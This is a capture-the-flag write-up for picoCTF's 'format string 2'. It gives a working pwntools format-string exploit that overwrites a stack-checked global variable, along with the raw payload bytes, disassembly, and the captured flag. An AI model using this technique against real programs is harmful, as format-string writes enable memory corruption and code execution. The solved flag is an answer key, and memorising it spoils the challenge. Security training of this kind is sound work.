# format string 2

This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must _change_ data on the stack! Download the binary [here](https://artifacts.picoctf.net/c_rhea/13/vuln). Download the source [here](https://artifacts.picoctf.net/c_rhea/13/vuln.c).

From the sourcecode, we have the following check:

```c
if (sus == 0x67616c66) {
	// Read and print the flag
}
```

We have to change the value of `sus`, which is initially set to `0x21737573` (`sus!`), to this value (`flag`). We can use `pwntools` to do this:

```python
from pwn import *

context.log_level = "critical"
context.binary = ELF('./vuln')

p = remote('rhea.picoctf.net', int(sys.argv[1]))

def exec_fmt(payload):
    p = remote('rhea.picoctf.net', int(sys.argv[1]))
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

p.sendline(payload)

flag = p.recvall()

print(f'Flag: {flag}')
print(f'Payload: {payload}')

```

This script `exec_fmt()` and `autofmt` to find the offset for the payload (ref: [pwntools Documentation  - fmtstr](https://docs.pwntools.com/en/stable/fmtstr.html)). The `0x404060` is the address of `sus` which can be validated via `objdump -D vuln`:

```
401273:       8b 05 e7 2d 00 00       mov    0x2de7(%rip),%eax        # 404060 <sus>
401279:       3d 66 6c 61 67          cmp    $0x67616c66,%eax
```

```
Flag: b"You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\nHere's your input:                                                                                                      uc    \x00                                                                                                                                                                                                                                                    \x00aaaaba`@@\nI have NO clue how you did that, you must be a wizard. Here you go...\npicoCTF{f0rm47_57r?_f0rm47_m3m_e371fb20}"
Payload: b'%102c%20$llnc%21$hhn%5c%22$hhn%245c%23$hhnaaaaba`@@\x00\x00\x00\x00\x00c@@\x00\x00\x00\x00\x00a@@\x00\x00\x00\x00\x00b@@\x00\x00\x00\x00\x00'

```

```
picoCTF{f0rm47_57r?_f0rm47_m3m_e371fb20}
```